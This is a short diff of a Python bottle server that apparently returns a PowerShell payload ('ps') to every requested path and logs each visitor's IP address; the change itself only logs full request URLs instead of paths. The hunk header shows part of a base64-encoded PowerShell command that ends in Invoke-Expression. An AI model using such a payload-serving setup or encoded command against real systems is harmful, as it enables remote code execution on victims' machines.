@@ -50,14 +50,13 @@ AHMAaQBvAG4AIAAtAGMAbwBtAG0AYQBuAGQAIAAkAGQAZQBzADsAaQBuAHYAbwBrAGUALQBlAHgAcABy
 
 @route('/<n:path>',method=["POST","GET"])
 def powershell(n):
-    logger.info(json.dumps({"IP":request.remote_addr,"Path":n}))
+    logger.info(json.dumps({"IP":request.remote_addr,"Path":request.url}))
     return ps
 
 @route('/')
 def index():
-    logger.info(json.dumps({"IP": request.remote_addr, "Path": "/"}))
+    logger.info(json.dumps({"IP": request.remote_addr, "Path": request.url}))
     return ps
-
 
 
 
